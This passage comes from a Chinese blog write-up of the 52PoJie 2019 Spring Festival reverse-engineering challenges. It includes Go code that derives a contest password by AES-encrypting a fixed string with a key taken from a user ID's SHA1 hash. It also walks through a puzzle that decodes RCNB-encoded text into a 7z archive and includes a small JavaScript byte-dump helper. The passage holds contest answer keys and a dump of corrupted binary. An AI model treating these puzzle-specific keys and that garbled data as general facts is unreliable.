class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">  output += chr(data[i])</span><br><span class="line"><span class="keyword">print</span> output</span><br><span class="line"><span class="comment"># HappyNewYearFrom52PoJie.Cn</span></span><br></pre></td></tr></table></figure><p>调试中可以从内存里dump到<code>EF2D8BFA0C30AB270B92CC73A563AFA3</code>其实这一串数据就是<code>uid</code>对应的<code>sha1</code>散列值<code>ef2d8bfa0c30ab270b92cc73a563afa3b04faa75</code>的字节数组形式，取前16位AES加密方式为<code>CBC</code>（<code>main_AesDecrypt</code>函数中可以直接看出），补码方式为<code>PKCS5Padding</code>（<code>AES</code>解密错误时，会退出程序，但是有异常信息一闪而过，给报错函数下断点即可查看异常信息）所以把<code>EF2D8BFA0C30AB270B92CC73A563AFA3</code>转化成字节数组，使用<code>AES/CBC/PKCS5Padding</code>方式加密<code>HappyNewYearFrom52PoJie.Cn</code>，再进行base64加密就可得到口令。</p><p>go语言实现代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"bytes"</span></span><br><span class="line">    <span class="string">"crypto/cipher"</span></span><br><span class="line">    <span class="string">"crypto/sha1"</span></span><br><span class="line">    <span class="string">"crypto/aes"</span></span><br><span class="line">    <span class="string">"encoding/base64"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS5Padding</span><span class="params">(ciphertext []<span class="keyword">byte</span>, blockSize <span class="keyword">int</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">    padding := blockSize - <span class="built_in">len</span>(ciphertext)%blockSize</span><br><span class="line">    padtext := bytes.Repeat([]<span class="keyword">byte</span>&#123;<span class="keyword">byte</span>(padding)&#125;, padding)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">append</span>(ciphertext, padtext...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS5UnPadding</span><span class="params">(origData []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">    length := <span class="built_in">len</span>(origData)</span><br><span class="line">    unpadding := <span class="keyword">int</span>(origData[length<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">return</span> origData[:(length - unpadding)]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesEncrypt</span><span class="params">(origData, key []<span class="keyword">byte</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">    block, err := aes.NewCipher(key)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    blockSize := block.BlockSize()</span><br><span class="line">    origData = PKCS5Padding(origData, blockSize)</span><br><span class="line">    blockMode := cipher.NewCBCEncrypter(block, key[:blockSize])</span><br><span class="line">    crypted := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(origData))</span><br><span class="line">    blockMode.CryptBlocks(crypted, origData)</span><br><span class="line">    <span class="keyword">return</span> crypted, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesDecrypt</span><span class="params">(crypted, key []<span class="keyword">byte</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">    block, err := aes.NewCipher(key)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    blockSize := block.BlockSize()</span><br><span class="line">    blockMode := cipher.NewCBCDecrypter(block, key[:blockSize])</span><br><span class="line">    origData := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(crypted))</span><br><span class="line">    blockMode.CryptBlocks(origData, crypted)</span><br><span class="line">    origData = PKCS5UnPadding(origData)</span><br><span class="line">    <span class="keyword">return</span> origData, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    uid := <span class="string">"351649"</span></span><br><span class="line">    h := sha1.New()</span><br><span class="line">    h.Write([]<span class="keyword">byte</span>(uid))</span><br><span class="line">    bs := h.Sum(<span class="literal">nil</span>)</span><br><span class="line">    <span class="keyword">var</span> aeskey = bs[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">    pass := []<span class="keyword">byte</span>(<span class="string">"HappyNewYearFrom52PoJie.Cn"</span>)</span><br><span class="line">    xpass, err := AesEncrypt(pass, aeskey)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    pass64 := base64.StdEncoding.EncodeToString(xpass)</span><br><span class="line">    fmt.Printf(<span class="string">"加密后:%v\n"</span>,pass64)</span><br><span class="line">    bytesPass, err := base64.StdEncoding.DecodeString(pass64)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    tpass, err := AesDecrypt(bytesPass, aeskey)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">"解密后:%s\n"</span>, tpass)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="【春节】解题领红包之番外篇"><a href="#【春节】解题领红包之番外篇" class="headerlink" title="【春节】解题领红包之番外篇"></a>【春节】解题领红包之番外篇</h1><p>番外篇个人感觉应该算是一道ctf里的misc题了。压缩包里给了一个大部分文字被加密的md文件：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># ȐĆŅƃȓƇńƃȒċƝÞɌÇńßɌĉŇƅŕƇŃbȒȼȵßȒĆȵƁȓĉnƁɌćǸß</span></span><br><span class="line"></span><br><span class="line">ƦćƝƁȓĉnƅȓčƞÞɌćÑbȒČŃbȒċÑbŕƇŃþȒČNƃȒĈÑƄȓĊÑƄŕƇņÞȓčƞÞɌćÑbȒċƝÞŘcǸÞȐĆŅBƦĊȵþřÇȵƅȐċŇbɌcńþȓČŇƁŕƇNƀȒČŃBɌćÑBɌċnƄȓĈƝbŗƇƞÞŗčnBŕƇnþȒȻŃBȓĉnƅȒČNƅȒƈŇþŕčȠßŕƇŃƃřčȠbřċȵƀ</span><br><span class="line"></span><br><span class="line">ȐčNƄŕƇņƃɌcŅƄɌċnþŕƇŇƁȓƇńƁŕƇńþɌcńƄŕƇńþɌCňƀƦȻƝƃŕƇńþɌCňƀȐĉņþŗcŅƅȒĈÑƄȓĊǸƅȓĈȵþɌćƞßŕƇņÞȒȻŃþɌCňƀɌćǸbȒȼǹßȓĈƝB</span><br><span class="line"></span><br><span class="line">[<span class="string">ƦĉņƃŖċŅþŕƇŅƀȒCŅƀȒƈŇþɌcŅƄɌĉŇßŕƇņÞȓčƞÞȒƈňþŕƇńþȓĉnþȓČŇBŗcŅƅɌćƞƁȓćŅƁŕƇņÞȒȻŃþɌCňƁ</span>](<span class="link">//rcnb.xyz</span>)</span><br><span class="line"></span><br><span class="line">řĊÑbȒĉȠƀɌćÑbȒċƝÞȓćŅƁɌƈȠƃŕƇŃþȒȻŃþȒĈƞÞȑÇǹƄɌCȠƄƦȻŇƅɌćƞBȐčnÞŗÇÑBřĊÑbɌĆnþŗÇǹb</span><br><span class="line"></span><br><span class="line">ȐȼŃßɌćÑbŕƇņÞȒȻŃƄŕƇņÞɌcńþȒCŅbŕȻ</span><br><span class="line"></span><br><span class="line">ŘĈÑƀƝƄŘȻŖĊǸƀrcnƃňßɍĉƞƀRČņbRÇrcnbrcnbrcnbŖĊƝƃrcnbrcnbrcnbrČNþȓĉƞƁnƅŔƇńÞrćǹƁȓĆÑƅŔȼŕÇƞƅƞßȐCŅƁȐƇŖĆňƁɌƇȵƃȑĈȠƃNƃƦčƝƄȓĉŕČňƃŇbȐĆȑćnƅŘȼȵßƞßRĆǸƄɌCƞBȑĊŅÞŗĊɌȼŃßŇƁŔcŔƈǹÞȠƁɌĆńƅɍĉƝÞŖÇɌcŇƅŖĆnþńƁȓČňƄŘȻȓȻnƃǸƁɌCȒćȵƁȵƄɌCŅƅȐčŃƀřCřƇŇƁǸþřÇƞbƦČnbRCƝßȐćǹƁŔȻřȻņBǹBȑċŗÇƞƃȠBɌĆÑƃŕčņƃȓƇńbŖčÑbɌĊŗƈÑBRcƞƁȑƇńÞƦČǹƀǸƀŘcŘȻnƅRCņƃŅƄȐĉNÞŘĈÑƄŕčȐćǹbŇÞȓćǹßɌĈŔȻňƀƝbȐÇrCǹÞȓȻŃBńƄɍċńbɌČŗƇnƅȵƀŗċņßRCŇbřČřćÑƀȐĊŃbǸƅɍcȑCȵbǸßȑƇȑCǹƅŘȻŃƃřċŃþnƄRċǹBrƇńƃŖĈȑĉņbƞƅƦĆrCƝÞƦĆÑBņƄrćȑƇÑƅńƄƦƇŗĆnƀŔĆȠƄȐćNƀÑƅƦȼȓĉŇƄȵßȑCǹƄȐȼŗćȠƃŅBȓCȠƁŔċƝßřcŘčŅbƦĊƝƃɌċƞƀnƁŘȻÑbŖčŗCnþȒȻÑƅNþřȼrƈNƁŕĆƝBȐÇňƅȐCŃßŅƄrćƞƀȓĊńƃŖƇǸƁřċŘćŃƁŘȼÑƅȑċȵƀŃþrƇŃßŕĉrćNþȒȻƝƁɌƈȠbƦĊNƅŔCƝßȓČńÞƦċŇbŖƈņƃŖĉȵþnƃɍĉɌƈňÞřčǹBȠbŕĉřċńþņƄȑÇƞƁȒcŘĉǸƅňƃȒcŔĈńßǹƁƦćȓȼǹƁÑƁƦCȑċŇƄȓƈnƄȵƄrcŘčnƃȵßRčȑcNƁrĊNƅȐÇŇƁņƁȒčnƀɌČňbɌĆrȼƞÞŇƃɌCřÇnþňƅȒȼƝBȑcȐȻnBňƁȑċȓcȠbǹþȑƇǹƁrĈŖƈňƁŗcȵbňþřȼƦĈŃƅňßŗcŃƀƦĊŔcńÞŖĉȠƅŃƁȑĊȐÇȠþƞÞɌƇȵƅȐȼɍĉÑBrƇŇƅŔčƞßnƅŗĈɍĆȵƅŖČņbŖĆȠÞȒċÑƃŗċNƃŕȻŃÞNÞŔčŕĆƞƃNƃRČȐĆņƁŃƀřċŃbȓčƝƃȑcŔĆNþȑčȠbŗĆNþŇƁȓčrčŃƄȑĉnþŅþȓȻřcÑƄŖƇÑßȐĆńbŅbŕĊŃßŕČŇÞȒcÑƁȑĆŘÇńƃRƈǸƅŕcȠbņÞȑċRƈŇƀȐcňþńÞƦĈɍCȠƀÑBRĉǸƁŗȼȑƇnƁȵßŕƇŖċƞƅřƇǹþŇƄŖÇȠƃRĈǸƅŕƇņþŔĊřƈňbƝßrƈŕÇǸþŃÞȐĆnbȑĉȑȻǸƃǹƀRƇrƈNbnƄrċrĉŅBƦcňþRċňƁnBŗȼÑƁŕċƞßɍĈŗćņƀǹƁȑĈŅþŔƇňƅŗƇrĊǹƄǸßȒƈǹßŕȻȠBŔćƝþŔȻÑBȓĆǸÞȑċŕĉŃþŃƀŘcřȻÑBŅƀɌƈńƄŔĊÑÞƦĈƞƃȓȼņƁŘȻnƄŔćŖċǸƄŅBŖÇȓĉŅBňƄȐȼŖÇņbǹƅrȻÑÞŔČŅßŔĊNþɌƇȠÞRĉnþřčŕċNþȠþƦȼȠƅRĆÑƄŗćŘčŃƄŖÇÑƄǹbȑĆŖÇǹþƞƄȓcƞƁRCǸƄɍćȒČNƅȓȻňÞņBRĆƞbřƇŖcȠbřȻńƄŗĆŃÞŃBƦĉŗĊNþřĊņßȒĆȠƁȑĊŅBȐƈȵBǹƁřcrĉƞbnƀƦċŘȼÑƀȒÇńƁŗCȠƁƝßrĊǹþŗȻŃƀȒȻɍċNßŖĉǸßŃÞrƇȒȼȠƃřƇŃƃNbŘċƦČňƅŔČnBŗČƞbƞßŔȼŔĊȠƀnƅŖċŕčŇƄǹBŔCřċǹƅȐČňƀƝƀřĈŖČȵßńÞɌCǹƃŔćȓċÑþŕȼƝƄȒcńbǹbȓƈƝƅɌĆȠƄŖćǹBŖƈŘÇƝƅƦĉŃƁŃßŖĉNƃŔĉÑƄŖĈƞþȑČȑČnBŃƁŔČnƃȒĈȓĈNBǸßȐCȠßȐčŅbɍĉƞþƦĉrȻŅBŇßȒȻǸƁŘȼŘċńBňbŘčnƄŘÇȒƈŇƅǹÞřćȐćŅÞƦċŇƄŇbɌƇƦƇńƀňƁrČRČņbȑÇŅßȵƅřȼŖĆǸƀŔCƝƀņÞȓƇrĊŇþňbŕÇŃƄŔƈńÞŘČȐĊƝbřȻǹƃɌČȠBńƄȒƇNþřĊɌćņBŕȼȠƃŖƇňþÑßȓȼȑČÑƅnƄɍĉnÞŗcŘƈňßȓĉȵƄȑcNbȠßƦÇŅƃɍĈƦĊnƁŖÇŅBŔcŃƁńƁɌċňÞŕĉƦCņƅƦȻȵƅȓÇǹƃȓĆȠƃRȻňƃřćǸƀŗƈǹßřĉňbȐČńƁɍĈŇÞÑÞŘćŗÇNbŗȻÑÞRƈǸƃǹƀŕȻRĉƞBńþŘȻŔĆƝƁņBŕȻNBRĉņƃȓČƝƁȐċÑƀRČŕƈňƀrčŇƅȐĊŅÞƦȼǹƁňƃȓĊnþřĈŘCnþȠƀȒcƞƃɌćɌĊȵƅŕƇňƃnƄŔčńÞRČřȼńbŇßŕĊňþŘCǹbŔĈnbŕĊńþȑcŃƄŔĈŔčńbȐčȠBřĉŅƃņƃŘƈɌÇÑÞŇƄȓĉɍċňƅńþŗCřČƝƄRCņÞƝƁŔĈRȼNƅȒCnƃɌƇǹßńÞŕƈŇBŘCŕȼÑBȒÇŃÞǸƁȓȼŕČȠþȵƁȑƈńƀŔcȑƇÑßrƈǸÞrcŃÞŇƅȓćɌćńƀɍćňƀȠƅŘȼǸƁɍĊřčƞÞņƃrĊǸƀŗcȓƈńƀŇƀȐcrĊŅBȓĈȠƁɍćnƁnÞɌƇÑƃȐȼƞßŔCɍćƞbƝBȒcņƁrċnBŗƈȓȻńƃɌCÑBƞƀȒČňßŔƇřƇǹbŖcņƃŕĆňþŕČņƅȒĉŇƅȐĈŇƁȠƃRĉŔƇǸþŘĊȵßŔȼńbȑƈȠBǹBɌčȵƃrčǹƄŔȻƞƅŗȼȒĆƞƀŖĉȵbŕcƝÞȒȼńBrċǸƅŘcȠÞȐčƝbȓĊŅbŘCȠƀɍĆȠƅŕĉNƀȠÞŖćřċńƁńþȓĉȠƁƦȻnƀȓÇɍĈŅƅǸƀȓčȒȻņƀǹÞɍcȑĆȵƃrȻƝƀɌCŃþɍĈȵþŖČņßňƅŗĉÑÞŕƈȑcŃƁǸßȒƇȐÇƞßńbŕƈȵBŕƇnƄȓċȑȼȠBɍċŅÞŗċŅƃƦčńƄňÞRÇrcŅƄȐÇȠÞřčȠÞƞBɌȼɍĈŇþɍĉÑƅǸBrĆňƃŖȻŕčȵbņßŘĊƞƀȐƈnþŘčȓȻÑÞŕcńþņbŔȼɌČÑBɌčȵbȑĈŅBŕĉƞƄÑþȒÇȓȻNƀÑßŘĈÑƀȐȼƝBŔĈȵþɍĊÑßŕĉȒȼnþŕÇņbńþɍĆŅÞŗĊŃƃRċņƅŘcNþȑĆŅƁrƈǸƄȒCƝþŖȻrÇŇbřĊŅƅȑƈŃBƦċnßňƅƦĉÑþȓĈřȼŃƀɍcŃƄȵþɌCřĆNƄǹƄƦȻŔčŅƃnƅrċrCǸƄȓƈŃƀrÇnƁrCÑƅrCȵƀrƈǹßrƈȵƁRĆƞƁrÇŇÞȵßƦČȑȼǸƁǹBȑcɌƈƝÞȒĆŅÞrĆňƃRćŇƁȠƅȓcrc</span><br></pre></td></tr></table></figure><p>这里给了一个网站，上面可以解密，得到明文md文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># Prove your Niubility</span><br><span class="line"></span><br><span class="line">Hello there, Welcome to the 52PoJiE Spring Festival 2019 Challenge - RCNB.</span><br><span class="line"></span><br><span class="line">To prove you are as NB as RC, complete this trial!</span><br><span class="line"></span><br><span class="line">[It&apos;s dangerous to go alone, take this!](//rcnb.xyz)</span><br><span class="line"></span><br><span class="line">And the key: Which_is_N0t_Th3_Answ3r</span><br><span class="line"></span><br><span class="line">With the trial:</span><br><span class="line"></span><br><span class="line">7z��&apos;�G�֐&apos;�l×v����2!���!$�x�Z�ˤ�XЂY�=��W�K�ï�z���������r�$]�I��q�Ib��iԎ�2C���Z�`�3��EW�w3X��</span><br><span class="line">                                                                                            ��*2�&apos;]�Kz�,&lt;`��5�&amp;�</span><br><span class="line">QT�~�z�rq+�I�1԰����r?�R���Y�5X�&lt;rA���U��[���G��^*�O- GP���l��</span><br><span class="line">��.:�7�3��:*J(v��]��,�h����nOˁ��X�&amp;�6�=Z\����g�h�y6I��nNJ�)�&amp;���yCE��A��#�</span><br><span class="line">                                                                          8��ȍr&apos;�M\?o:��W��Va�)����D��.�5V��Gi��A��)�,~�H¬?���&amp;��V�����~_;�P|�(</span><br><span class="line">$�e00&quot;��荈&#123;�����8�]�-1��_Z��G=�)oPd�</span><br><span class="line">�)���w;����8zOi��|&amp;���]à�&apos;�C�q�����SD&gt;��!��b��_� |�F�</span><br><span class="line">-�&apos;����-�ڷ���畢&#123;�ٙ���ti��E��ޕ;��</span><br><span class="line">���[&apos;��Yl�י*b����G�1�B�����~�:�و��׉��Aenqd�)ü#�EG-:�S/�ACb_[�V�H�l=Vg�-</span><br><span class="line">�۴�b7&amp;���ihCz��KLE0��)��H咣BT�0(k����m�&quot;�`��b�ĥq�&lt;IU�1������\��[�</span><br><span class="line">k��%���&quot;ɡ�菽a8��H��gb��Q</span><br><span class="line">                        J��ZLL��</span><br><span class="line">�_�$�|�ɡ����R�E�wu��t7#)S�\�����;&#123;l�W�����I�*Y��&#125;��GN�p�k*�?�2�@�S�&#125;���33���v</span><br><span class="line">                                                                             ���/���^Ӈ��!�R�N��F��5[�2�bvX ��ߍ�E؞%���d���</span><br><span class="line">                ��T�@��dy��r��B���?aHx�����&quot;�g����呴^+��|t$&#125;�x�C.���bp</span><br><span class="line">�X�lU|��&amp;׶��&#125;(���O�eq8s=店�C�#^�c�Q��&gt;�8��^���֙���b6&amp;��i�5FT�m$5�|�X�tA���s��&#125;��.h���Y��r�&#125;�(�,�&lt;W���V�����`�V08K�� -V�CV��&#125;�~d��� 0�y��</span><br><span class="line">                              q����wWxZe��#q&quot;�״�=�%��h�!��_�������#��ᷫDA8^kJqɊ�=E�&#123;%�m&gt;��k� p</span><br><span class="line">                                                                                                 $�</span><br><span class="line">SL˓`��]y</span><br><span class="line">        b</span><br><span class="line">v</span><br><span class="line">��</span><br></pre></td></tr></table></figure><p>最后面给出的trial看开头显然是个7z，那上面的key应该就是密码了。我把它存为一个新文件，然而这个字符<code>�</code>严重干扰了我好几个小时，让懵逼的我一度以为这是题目设计的加密。一开始我<code>xxd</code>了一下文件，发现有三个字节<code>efbfbd</code>频繁出现505次：</p><p><img src="/pics/2019-吾爱破解解题领红包活动/3.png" alt="震惊的xxd结果"></p><p>根据7z文件头<code>377a bcaf 271c 0004</code>尝试过替换，一度以为掉进了脑洞的陷阱。直到我看到<a href="https://liudanking.com/golang/utf-8_replacement_character/" target="_blank" rel="noopener">这篇文章</a>，才知道这串字节就是那个字符。</p><p>后来在github上找到了rcnb的源码，修改js，将明文每个字节以int的形式输出，再用python一跑拿到压缩包：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printRes</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> res=rcnb.decode(str)</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;res.length; i++) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res[i])</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// console.log(res)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printRes(<span class="string">'ŘĈÑƀƝƄŘȻŖĊǸƀrcnƃňßɍĉƞƀRČņbRÇrcnbrcnbrcnbŖĊƝƃrcnbrcnbrcnbrČNþȓĉƞƁnƅŔƇńÞrćǹƁȓĆÑƅŔȼŕÇƞƅƞßȐCŅƁȐƇŖĆňƁɌƇȵƃȑĈȠƃNƃƦčƝƄȓĉŕČňƃŇbȐĆȑćnƅŘȼȵßƞßRĆǸƄɌCƞBȑĊŅÞŗĊɌȼŃßŇƁŔcŔƈǹÞȠƁɌĆńƅɍĉƝÞŖÇɌcŇƅŖĆnþńƁȓČňƄŘȻȓȻnƃǸƁɌCȒćȵƁȵƄɌCŅƅȐčŃƀřCřƇŇƁǸþřÇƞbƦČnbRCƝßȐćǹƁŔȻřȻņBǹBȑċŗÇƞƃȠBɌĆÑƃŕčņƃȓƇńbŖčÑbɌĊŗƈÑBRcƞƁȑƇńÞƦČǹƀǸƀŘcŘȻnƅRCņƃŅƄȐĉNÞŘĈÑƄŕčȐćǹbŇÞȓćǹßɌĈŔȻňƀƝbȐÇrCǹÞȓȻŃBńƄɍċńbɌČŗƇnƅȵƀŗċņßRCŇbřČřćÑƀȐĊŃbǸƅɍcȑCȵbǸßȑƇȑCǹƅŘȻŃƃřċŃþnƄRċǹBrƇńƃŖĈȑĉņbƞƅƦĆrCƝÞƦĆÑBņƄrćȑƇÑƅńƄƦƇŗĆnƀŔĆȠƄȐćNƀÑƅƦȼȓĉŇƄȵßȑCǹƄȐȼŗćȠƃŅBȓCȠƁŔċƝßřcŘčŅbƦĊƝƃɌċƞƀnƁŘȻÑbŖčŗCnþȒȻÑƅNþřȼrƈNƁŕĆƝBȐÇňƅȐCŃßŅƄrćƞƀȓĊńƃŖƇǸƁřċŘćŃƁŘȼÑƅȑċȵƀŃþrƇŃßŕĉrćNþȒȻƝƁɌƈȠbƦĊNƅŔCƝßȓČńÞƦċŇbŖƈņƃŖĉȵþnƃɍĉɌƈňÞřčǹBȠbŕĉřċńþņƄȑÇƞƁȒcŘĉǸƅňƃȒcŔĈńßǹƁƦćȓȼǹƁÑƁƦCȑċŇƄȓƈnƄȵƄrcŘčnƃȵßRčȑcNƁrĊNƅȐÇŇƁņƁȒčnƀɌČňbɌĆrȼƞÞŇƃɌCřÇnþňƅȒȼƝBȑcȐȻnBňƁȑċȓcȠbǹþȑƇǹƁrĈŖƈňƁŗcȵbňþřȼƦĈŃƅňßŗcŃƀƦĊŔcńÞŖĉȠƅŃƁȑĊȐÇȠþƞÞɌƇȵƅȐȼɍĉÑBrƇŇƅŔčƞßnƅŗĈɍĆȵƅŖČņbŖĆȠÞȒċÑƃŗċNƃŕȻŃÞNÞŔčŕĆƞƃNƃRČȐĆņƁŃƀřċŃbȓčƝƃȑcŔĆNþȑčȠbŗĆNþŇƁȓčrčŃƄȑĉnþŅþȓȻřcÑƄŖƇÑßȐĆńbŅbŕĊŃßŕČŇÞȒcÑƁȑĆŘÇńƃRƈǸƅŕcȠbņÞȑċRƈŇƀȐcňþńÞƦĈɍCȠƀÑBRĉǸƁŗȼȑƇnƁȵßŕƇŖċƞƅřƇǹþŇƄŖÇȠƃRĈǸƅŕƇņþŔĊřƈňbƝßrƈŕÇǸþŃÞȐĆnbȑĉȑȻǸƃǹƀRƇrƈNbnƄrċrĉŅBƦcňþRċňƁnBŗȼÑƁŕċƞßɍĈŗćņƀǹƁȑĈŅþŔƇňƅŗƇrĊǹƄǸßȒƈǹßŕȻȠBŔćƝþŔȻÑBȓĆǸÞȑċŕĉŃþŃƀŘcřȻÑBŅƀɌƈńƄŔĊÑÞƦĈƞƃȓȼņƁŘȻnƄŔćŖċǸƄŅBŖÇȓĉŅBňƄȐȼŖÇņbǹƅrȻÑÞŔČŅßŔĊNþɌƇȠÞRĉnþřčŕċNþȠþƦȼȠƅRĆÑƄŗćŘčŃƄŖÇÑƄǹbȑĆŖÇǹþƞƄȓcƞƁRCǸƄɍćȒČNƅȓȻňÞņBRĆƞbřƇŖcȠbřȻńƄŗĆŃÞŃBƦĉŗĊNþřĊņßȒĆȠƁȑĊŅBȐƈȵBǹƁřcrĉƞbnƀƦċŘȼÑƀȒÇńƁŗCȠƁƝßrĊǹþŗȻŃƀȒȻɍċNßŖĉǸßŃÞrƇȒȼȠƃřƇŃƃNbŘċƦČňƅŔČnBŗČƞbƞßŔȼŔĊȠƀnƅŖċŕčŇƄǹBŔCřċǹƅȐČňƀƝƀřĈŖČȵßńÞɌCǹƃŔćȓċÑþŕȼƝƄȒcńbǹbȓƈƝƅɌĆȠƄŖćǹBŖƈŘÇƝƅƦĉŃƁŃßŖĉNƃŔĉÑƄŖĈƞþȑČȑČnBŃƁŔČnƃȒĈȓĈNBǸßȐCȠßȐčŅbɍĉƞþƦĉrȻŅBŇßȒȻǸƁŘȼŘċńBňbŘčnƄŘÇȒƈŇƅǹÞřćȐćŅÞƦċŇƄŇbɌƇƦƇńƀňƁrČRČņbȑÇŅßȵƅřȼŖĆǸƀŔCƝƀņÞȓƇrĊŇþňbŕÇŃƄŔƈńÞŘČȐĊƝbřȻǹƃɌČȠBńƄȒƇNþřĊɌćņBŕȼȠƃŖƇňþÑßȓȼȑČÑƅnƄɍĉnÞŗcŘƈňßȓĉȵƄȑcNbȠßƦÇŅƃɍĈƦĊnƁŖÇŅBŔcŃƁńƁɌċňÞŕĉƦCņƅƦȻȵƅȓÇǹƃȓĆȠƃRȻňƃřćǸƀŗƈǹßřĉňbȐČńƁɍĈŇÞÑÞŘćŗÇNbŗȻÑÞRƈǸƃǹƀŕȻRĉƞBńþŘȻŔĆƝƁņBŕȻNBRĉņƃȓČƝƁȐċÑƀRČŕƈňƀrčŇƅȐĊŅÞƦȼǹƁňƃȓĊnþřĈŘCnþȠƀȒcƞƃɌćɌĊȵƅŕƇňƃnƄŔčńÞRČřȼńbŇßŕĊňþŘCǹbŔĈnbŕĊńþȑcŃƄŔĈŔčńbȐčȠBřĉŅƃņƃŘƈɌÇÑÞŇƄȓ